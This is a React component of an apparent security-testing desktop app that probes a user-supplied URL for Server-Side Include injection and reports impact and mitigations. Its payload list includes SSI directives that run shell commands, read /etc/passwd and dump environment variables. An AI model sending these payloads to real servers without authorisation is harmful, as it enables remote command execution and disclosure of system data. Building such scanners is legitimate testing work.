import React, { useState } from 'react';
import { useStore } from '../../store/store';
import styles from './SharedTool.module.css';
import { ShieldIcon, LoadingIcon } from '../common/Icons';
import ToolWrapper from './ToolWrapper';

interface SSITest {
  vulnerable: boolean;
  foundDirectives: string[];
  testedPayloads: Array<{
    payload: string;
    detected: boolean;
    response: string;
  }>;
  details: string[];
}

export const SSInjection: React.FC = () => {
  const { addToolResult } = useStore();
  const [targetUrl, setTargetUrl] = useState('');
  const [parameter, setParameter] = useState('');
  const [method, setMethod] = useState<'GET' | 'POST'>('GET');
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState<SSITest | null>(null);

  const testSSI = async () => {
    if (!targetUrl) return;

    setLoading(true);
    setResult(null);

    try {
      const details: string[] = [];
      const foundDirectives: string[] = [];
      const testedPayloads: Array<{ payload: string; detected: boolean; response: string }> = [];
      let vulnerable = false;

      details.push(`Testing SSI on: ${targetUrl}`);
      details.push(`Method: ${method}`);
      details.push(`Parameter: ${parameter || 'URL path'}`);

      const payloads = [
        {
          name: 'Basic exec',
          payload: '<!--#exec cmd="ls" -->',
          detect: ['total', 'drwx', 'root', 'bin'],
        },
        {
          name: 'Echo directive',
          payload: '<!--#echo var="DATE_LOCAL" -->',
          detect: ['202', 'day', 'mon'],
        },
        {
          name: 'Include directive',
          payload: '<!--#include virtual="/etc/passwd" -->',
          detect: ['root:', 'bin:', 'daemon:'],
        },
        {
          name: 'Config directive',
          payload: '<!--#config timefmt="%A %B %d %Y" --><!--#echo var="DATE_LOCAL" -->',
          detect: ['day', 'month'],
        },
        {
          name: 'Exec with shell',
          payload: '<!--#exec cmd="cat /etc/passwd" -->',
          detect: ['root:', 'x:0:0:', '/bin/'],
        },
        {
          name: 'XSS via SSI',
          payload: '<!--#echo var="HTTP_USER_AGENT" -->',
          detect: ['mozilla', 'chrome', 'safari', 'electron'],
        },
        {
          name: 'Environment vars',
          payload: '<!--#printenv -->',
          detect: ['PATH=', 'HOME=', 'USER='],
        },
        {
          name: 'File size',
          payload: '<!--#fsize file="index.html" -->',
          detect: ['bytes', 'kb', 'size'],
        },
      ];

      details.push(`\nTesting ${payloads.length} SSI payloads...`);

      for (const test of payloads) {
        try {
          let url = targetUrl;
          let body: string | undefined = undefined;

          if (method === 'GET' && parameter) {
            const separator = targetUrl.includes('?') ? '&' : '?';
            url = `${targetUrl}${separator}${parameter}=${encodeURIComponent(test.payload)}`;
          } else if (method === 'POST' && parameter) {
            body = JSON.stringify({ [parameter]: test.payload });
          } else {
            url = `${targetUrl}${test.payload}`;
          }

          const response = await window.electronAPI.net.httpFetch(url, {
            method: method,
            headers:
              method === 'POST'
                ? {
                    'Content-Type': 'application/json',
                  }
                : undefined,
            body: body,
          });

          const responseText = String(response).toLowerCase();
          let detected = false;

          for (const indicator of test.detect) {
            if (responseText.includes(indicator.toLowerCase())) {
              detected = true;
              vulnerable = true;
              foundDirectives.push(test.name);
              details.push(`✓ ${test.name}: EXECUTED!`);
              details.push(`  Detected: "${indicator}" in response`);
              break;
            }
          }

          if (!detected && responseText.includes('<!--#')) {
            details.push(`⚠️  ${test.name}: Directive visible but not executed`);
            details.push(`  May indicate SSI disabled or sandboxed`);
          } else if (!detected) {
            details.push(`✗ ${test.name}: Not vulnerable`);
          }

          testedPayloads.push({
            payload: test.payload,
            detected,
            response: String(response).substring(0, 200),
          });

          await new Promise((resolve) => setTimeout(resolve, 200));
        } catch (error) {
          const errorMsg = error instanceof Error ? error.message : 'Unknown error';
          details.push(`✗ ${test.name}: Error - ${errorMsg}`);
          testedPayloads.push({
            payload: test.payload,
            detected: false,
            response: `Error: ${errorMsg}`,
          });
        }
      }

      details.push(`\n=== Test Summary ===`);
      details.push(`Total payloads tested: ${payloads.length}`);
      details.push(`Successful injections: ${foundDirectives.length}`);

      if (vulnerable) {
        details.push(`\n⚠️  SSI INJECTION VULNERABILITY DETECTED!`);
        details.push(`Successful directives: ${foundDirectives.join(', ')}`);
        details.push(`\nImpact:`);
        details.push(`- Remote code execution possible`);
        details.push(`- File system access`);
        details.push(`- Information disclosure`);
        details.push(`\nMitigation:`);
        details.push(`- Disable SSI on production servers`);
        details.push(`- Sanitize user input (remove <!-- --> sequences)`);
        details.push(`- Use SSI only on trusted content`);
        details.push(`- Apply least privilege to web server`);
      } else {
        details.push(`✓ No SSI injection vulnerabilities detected`);
        details.push(`Server appears not to process SSI directives`);
      }

      const testResult: SSITest = {
        vulnerable,
        foundDirectives,
        testedPayloads,
        details,
      };

      setResult(testResult);
      addToolResult({
        id: Date.now().toString(),
        toolName: 'SSI Injection',
        input: { targetUrl, parameter, method },
        output: testResult,
        success: true,
        timestamp: Date.now(),
      });
    } catch (error) {
      const errorMsg = error instanceof Error ? error.message : 'Unknown error';
      setResult({
        vulnerable: false,
        foundDirectives: [],
        testedPayloads: [],
        details: [`Error: ${errorMsg}`],
      });
    } finally {
      setLoading(false);
    }
  };

  return (
    <ToolWrapper
      title="Server-Side Include (SSI) Injection"
      icon={<ShieldIcon />}
      description="Test for SSI injection vulnerabilities"
    >
      <div className={styles.section}>
        <div className={styles.inputGroup}>
          <label className={styles.label}>Target URL:</label>
          <input
            type="text"
            value={targetUrl}
            onChange={(e) => setTargetUrl(e.target.value)}
            placeholder="https://example.com/page.shtml"
            className={styles.input}
          />
        </div>

        <div className={styles.inputGroup}>
          <label className={styles.label}>Parameter Name (optional):</label>
          <input
            type="text"
            value={parameter}
            onChange={(e) => setParameter(e.target.value)}
            placeholder="content, message, text..."
            className={styles.input}
          />
        </div>

        <div className={styles.inputGroup}>
          <label className={styles.label}>HTTP Method:</label>
          <select
            value={method}
            onChange={(e) => setMethod(e.target.value as 'GET' | 'POST')}
            className={styles.select}
          >
            <option value="GET">GET</option>
            <option value="POST">POST</option>
          </select>
        </div>

        <div className={styles.buttonGroup}>
          <button onClick={testSSI} disabled={loading || !targetUrl} className={styles.primaryBtn}>
            {loading ? (
              <>
                <LoadingIcon /> Testing...
              </>
            ) : (
              'Test SSI Injection'
            )}
          </button>
        </div>
      </div>

      {result && (
        <div className={styles.resultBox}>
          <div className={styles.resultHeader}>
            <span className={styles.resultTitle}>SSI Injection Test Results</span>
          </div>

          <div className={styles.resultItem}>
            <strong>Vulnerability Status:</strong>{' '}
            <span
              style={{
                color: result.vulnerable ? '#ff4444' : '#44ff44',
                fontWeight: 'bold',
                fontSize: '1.1em',
              }}
            >
              {result.vulnerable ? '⚠️ VULNERABLE' : '✓ Not Vulnerable'}
            </span>
          </div>

          {result.foundDirectives.length > 0 && (
            <div className={styles.resultItem}>
              <strong>Executed SSI Directives:</strong>
              <ul>
                {result.foundDirectives.map((directive, idx) => (
                  <li key={idx} style={{ color: '#ff4444' }}>
                    {directive}
                  </li>
                ))}
              </ul>
            </div>
          )}

          <div className={styles.resultItem}>
            <strong>Test Summary:</strong>
            <div>Total Tests: {result.testedPayloads.length}</div>
            <div>Successful: {result.testedPayloads.filter((p) => p.detected).length}</div>
            <div>Failed: {result.testedPayloads.filter((p) => !p.detected).length}</div>
          </div>

          <div className={styles.resultItem}>
            <strong>Detailed Results:</strong>
            <pre className={styles.codeBlock}>{result.details.join('\n')}</pre>
          </div>

          {result.testedPayloads.filter((p) => p.detected).length > 0 && (
            <div className={styles.resultItem}>
              <strong>Successful Payloads:</strong>
              {result.testedPayloads
                .filter((p) => p.detected)
                .map((test, idx) => (
                  <div
                    key={idx}
                    style={{ marginTop: '10px', padding: '10px', border: '1px solid #ff4444' }}
                  >
                    <div>
                      <strong>Payload:</strong> <code>{test.payload}</code>
                    </div>
                    <div>
                      <strong>Response:</strong>
                    </div>
                    <pre className={styles.codeBlock}>{test.response}</pre>
                  </div>
                ))}
            </div>
          )}
        </div>
      )}
    </ToolWrapper>
  );
};

export default SSInjection;
